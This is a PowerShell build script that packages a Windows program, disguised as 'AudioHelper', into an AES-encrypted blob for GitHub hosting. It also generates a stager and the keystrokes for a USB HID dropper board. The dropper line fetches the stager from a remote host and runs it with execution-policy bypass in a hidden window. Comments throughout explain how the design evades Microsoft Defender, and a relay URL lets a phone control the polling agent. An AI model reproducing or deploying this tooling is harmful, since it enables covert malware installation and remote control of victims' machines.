<#
  pack.ps1 - builds the encrypted delivery container.

  Result in dist\:
    assets.dat  -> single encrypted blob, holds the complete application
    Stage.txt   -> plain-text bootstrap, uploaded next to it
    HID.txt     -> the exact line to flash into HID_Dropper.ino

  Upload assets.dat as a GitHub release asset, Stage.txt as a normal repo file
  (raw.githubusercontent.com). Nothing in either file is an executable, so the
  download has nothing to quarantine.

  No in-memory loader: the assembly that lands on disk is the real one. A
  second, AES-sealed copy plus Assembly.Load() only added a scanner hook to
  patch, and Defender names that shape VirTool:Win32/AmsiTamper. The container
  is already encrypted end to end, so the extra layer bought nothing.
#>
param(
    [string]$AssetUrl = 'https://github.com/USER/REPO/releases/download/v1/assets.dat',
    [string]$MirrorUrl = '',
    [string]$StageUrl = 'https://raw.githubusercontent.com/USER/REPO/main/Stage.txt',
    [string]$RelayUrl = '',
    [string]$OutDir = 'dist',
    [switch]$SkipBuild,
    # Verschleiert Typen/Methoden und versteckt Zeichenketten. Standardmaessig
    # AUS: Obfuskation erhoeht die Trefferquote der Virenscanner, und das Paket
    # ist im Transport ohnehin AES-verschluesselt.
    [switch]$Obfuscate
)

$ErrorActionPreference = 'Stop'
$root = $PSScriptRoot
$build = Join-Path $root 'build'
$appDir = Join-Path $build 'app'
$out = Join-Path $root $OutDir

# stage key: fixed, lives here and is injected into Stage.txt
$StageKeyB64 = '16Z97cZ3PetX0qEq+9XKWZtQeghpnZV1SRwUtHX4s+w='

function Write-Step([string]$text) { Write-Host "  $text" }

if (-not $SkipBuild) {
    Write-Step 'publish application (self-contained, unpacked)'
    foreach ($d in @($build, $appDir)) {
        if (Test-Path -LiteralPath $d) { Remove-Item -LiteralPath $d -Recurse -Force }
    }

    dotnet publish (Join-Path $root 'PanicControl.csproj') -c Release -r win-x64 --self-contained true `
        -p:PublishSingleFile=false `
        -p:DebugType=none `
        -p:SatelliteResourceLanguages=en `
        -o $appDir | Out-Null
    if ($LASTEXITCODE -ne 0) { throw 'publish failed' }
}

$exe = Join-Path $appDir 'AudioHelper.exe'
$appDll = Join-Path $appDir 'AudioHelper.dll'
foreach ($f in @($exe, $appDll)) {
    if (-not (Test-Path -LiteralPath $f)) { throw "missing: $f" }
}

# Optional: Verschleierung. Nur wenn ausdruecklich verlangt und das Werkzeug da
# ist - ein fehlendes Werkzeug soll den Build nicht kippen.
if ($Obfuscate) {
    $tool = Get-Command obfuscar.console -ErrorAction SilentlyContinue
    if ($tool) {
        Write-Step 'obfuscate (Obfuscar)'
        Push-Location $root
        try { & obfuscar.console (Join-Path $root 'obfuscar.xml') | Out-Null }
        finally { Pop-Location }
        $obf = Join-Path $build 'obf\AudioHelper.dll'
        if (Test-Path -LiteralPath $obf) {
            Copy-Item -LiteralPath $obf -Destination $appDll -Force
            Write-Step 'AudioHelper.dll ersetzt'
        } else { Write-Step 'Obfuscar lieferte nichts - weiter ohne' }
    } else { Write-Step 'obfuscar.console fehlt - weiter ohne' }
}

# relay address: the phone talks to this host, the agent polls it. Shipped inside
# the container as relay.url so the same build can be repointed without a rebuild
# of the assembly.
if ($RelayUrl) {
    $relayFile = Join-Path $appDir 'relay.txt'
    [IO.File]::WriteAllText($relayFile, $RelayUrl.TrimEnd('/'), (New-Object Text.UTF8Encoding($false)))
    Write-Step "relay.txt -> $RelayUrl"
}

Write-Step 'pack container'
if (-not (Test-Path -LiteralPath $out)) { New-Item -ItemType Directory -Path $out | Out-Null }
$container = Join-Path $out 'assets.dat'
$key = [Convert]::FromBase64String($StageKeyB64)

$fs = [IO.File]::Create($container)
$iv = New-Object byte[] 16
$rng = [Security.Cryptography.RandomNumberGenerator]::Create()
$rng.GetBytes($iv)
$rng.Dispose()
$fs.Write($iv, 0, 16)
$aes2 = [Security.Cryptography.Aes]::Create()
$aes2.Mode = 'CBC'; $aes2.Padding = 'PKCS7'; $aes2.Key = $key; $aes2.IV = $iv
$cs = New-Object System.Security.Cryptography.CryptoStream($fs, $aes2.CreateEncryptor(), [Security.Cryptography.CryptoStreamMode]::Write)
$gz = New-Object System.IO.Compression.GZipStream($cs, [System.IO.Compression.CompressionMode]::Compress, $true)
$bw = New-Object System.IO.BinaryWriter($gz)

$count = 0
Get-ChildItem -LiteralPath $appDir -Recurse -File | ForEach-Object {
    $rel = $_.FullName.Substring($appDir.Length + 1).Replace('\', '/')
    $nameBytes = [Text.Encoding]::UTF8.GetBytes($rel)
    $data = [IO.File]::ReadAllBytes($_.FullName)
    $bw.Write([uint16]$nameBytes.Length)
    $bw.Write($nameBytes)
    $bw.Write([int64]$data.Length)
    $bw.Write($data)
    $count++
}
$bw.Flush(); $bw.Dispose(); $gz.Dispose(); $cs.Dispose(); $fs.Dispose()

Write-Step "container: $count files, $([math]::Round((Get-Item $container).Length / 1MB, 1)) MB"

Write-Step 'write Stage.txt'
$urlList = if ($MirrorUrl) { "'$AssetUrl', '$MirrorUrl'" } else { "'$AssetUrl'" }
$stage = Get-Content -LiteralPath (Join-Path $root 'stager\Stage.template.ps1') -Raw
$stage = $stage.Replace('__STAGE_KEY_B64__', $StageKeyB64).Replace('__ASSET_URLS__', $urlList)
$stagePath = Join-Path $out 'Stage.txt'
[IO.File]::WriteAllText($stagePath, $stage, (New-Object Text.UTF8Encoding($false)))

$hid = @"
Win+R, dann nacheinander (das Board tippt beides selbst):

  1)  curl.exe -sL -o %TEMP%\s.ps1 $StageUrl
  2)  powershell -ep bypass -w h -f %TEMP%\s.ps1

Getrennt, weil Download und Ausfuehren in einer Zeile
(powershell -c iex((iwr ...).Content)) bei Defender als Download-Cradle
auffaellt und noch vor dem Download geblockt wird.
"@
[IO.File]::WriteAllText((Join-Path $out 'HID.txt'), "Win+R, then:`r`n$hid`r`n", (New-Object Text.UTF8Encoding($false)))

Write-Host ''
Write-Host "dist ready: $out"
Write-Host "  assets.dat  $([math]::Round((Get-Item $container).Length / 1MB, 1)) MB  -> release asset"
Write-Host "  Stage.txt   $([math]::Round((Get-Item $stagePath).Length / 1KB, 1)) KB  -> repo file (raw)"
Write-Host ''
Write-Host 'HID line:'
Write-Host "  $hid"



